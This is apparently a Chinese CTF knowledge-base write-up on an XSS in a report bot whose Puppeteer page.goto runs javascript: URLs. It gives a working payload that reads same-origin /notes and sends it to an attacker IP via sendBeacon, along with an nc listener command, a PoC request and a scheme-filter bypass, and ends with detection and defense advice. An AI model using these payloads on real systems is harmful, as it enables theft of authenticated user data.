---
id: ctf-web-bot-report-javascript-scheme-xss-exfil
title: 'report bot 未校验 URL scheme：page.goto 直接执行 javascript: 伪协议 XSS，sendBeacon 外带同源数据'
type: scenario
domain: ctf
path: ctf/web
technique: bot-report-javascript-scheme-xss-exfil
tags:
- ctf
- web
- xss
- bot
- javascript-uri
- puppeteer
- exfiltration
severity: high
confidence: high
status: draft
created: '2026-11-08'
updated: '2026-11-08'
url: /docs/ctf/web/ctf-web-bot-report-javascript-scheme-xss-exfil/
draft: false
kb_aliases:
- javascript 伪协议 XSS
- bot 访问 URL 未过滤
- report 接口 XSS
- page.goto XSS
- sendBeacon 外带笔记
---

## 一句话结论

举报/反馈接口把用户提交的 URL 未经任何协议白名单校验直接交给无头浏览器 `page.goto(url)`，攻击者提交 `javascript:fetch('/notes').then(r=>r.text()).then(d=>navigator.sendBeacon('http://ip:port/',d))` 即可在 bot 浏览器的同源上下文中执行任意 JS，读取同源页面数据并外带。

## 原理

- bot 先在站内以高权限身份创建含敏感数据（flag）的笔记，随后 `page.goto(url)` 访问攻击者 URL；`goto` 对 `javascript:` 伪协议同样会求值执行，等价于在当前页面（`http://localhost:3000` 源）执行该 JS；
- 由于执行上下文与目标站点同源，`fetch('/notes')` 可以直接读取登录态下的敏感接口（会话 Cookie 自动携带），无需绕过任何跨域限制；
- `navigator.sendBeacon` 在页面即将跳转/关闭时也能异步发出 POST，且不受页面卸载中断，是把数据带到攻击者服务器的可靠通道；
- 漏洞根因是把"URL"当纯文本处理而未做 scheme 白名单（只允许 http/https）或协议相对性校验，`javascript:`、`data:` 等伪协议直达浏览器解析器。

## 触发条件

1. 存在接收 URL 并由无头浏览器（puppeteer/playwright）访问的 report/bot 接口；
2. 访问前未校验 URL scheme（或校验可绕过）；
3. bot 访问前已在目标站点建立高权限会话（先在站内执行了敏感操作）。

## 利用步骤

1. 监听外带端口：`nc -lvp 9000`；
2. 提交 payload 到 /report：`javascript:fetch('/notes').then(r=>r.text()).then(d=>navigator.sendBeacon('http://ip:9000/',d))`；
3. bot 先以自身身份在站内创建含 flag 的笔记，再 goto 该 javascript: URL；
4. 同源 fetch 读取 /notes 页面 HTML，sendBeacon POST 到攻击者服务器；
5. 从收到的 HTML 中提取 flag（题目为非预期解：常规解为 XSS 盗取 noteId）。

## PoC

```
POST /report  {"url":"javascript:fetch('/notes').then(r=>r.text()).then(d=>navigator.sendBeacon('http://IP:9000/',d))"}
# nc -lvp 9000 收到 POST /，Content-Type: text/plain，正文为 /notes 的完整 HTML（含 flag）
```

## 变体与关联

- scheme 白名单存在但实现有缺陷时（如只 `startsWith('http')`），可用 `javascript://http%0aalert(1)` 一类变形绕过；
- `data:text/html;base64,...` 页面内再嵌 iframe/script 是另一种托管载体，但无同源特权，需配合目标站跳转；
- 与 bot 访问类链（jku/CRLF 换 Cookie 等）可组合：先用 javascript: XSS 拿到会话/页面数据，再进一步攻击。

## 检测与防御

- 检测：审计所有把用户 URL 交给浏览器内核/HTTP 客户端访问的接口，测试提交 `javascript:`、`data:`、`vbscript:` scheme；
- 防御：只允许 `http(s)` scheme（解析 URL 后取 `urlparse().scheme` 白名单校验，而非字符串前缀）；bot 容器网络隔离，仅允许访问目标站点；对 bot 会话与敏感数据操作分离（先访问 URL 再执行敏感写入，或使用独立身份）。
